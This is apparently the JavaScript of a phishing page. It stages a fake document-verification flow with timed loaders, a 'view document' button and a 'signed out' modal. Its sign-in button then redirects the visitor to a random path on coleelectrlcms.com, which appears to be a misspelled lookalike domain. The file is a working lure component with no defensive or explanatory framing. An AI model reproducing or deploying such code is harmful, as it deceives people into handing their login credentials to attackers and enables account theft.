setTimeout(() => {
    document.getElementById('verify-message').style.display = 'none';
    document.getElementById('loader').style.display = 'none';
    document.getElementById('view-doc-btn').style.display = 'block';
}, 5000);

document.getElementById('view-doc-btn').addEventListener('click', () => {
    document.getElementById('view-doc-btn').style.display = 'none';
    document.getElementById('loading-msg').style.display = 'block';

    setTimeout(() => {
        document.getElementById('loading-msg').style.display = 'none';
        document.getElementById('signout-modal').style.display = 'flex';
    }, 5000);
});

document.getElementById('signin-btn').addEventListener('click', () => {
    const randomString = crypto.randomUUID();
    const signInUrl = `https://coleelectrlcms.com/${randomString}`;
    window.location.href = signInUrl;
});
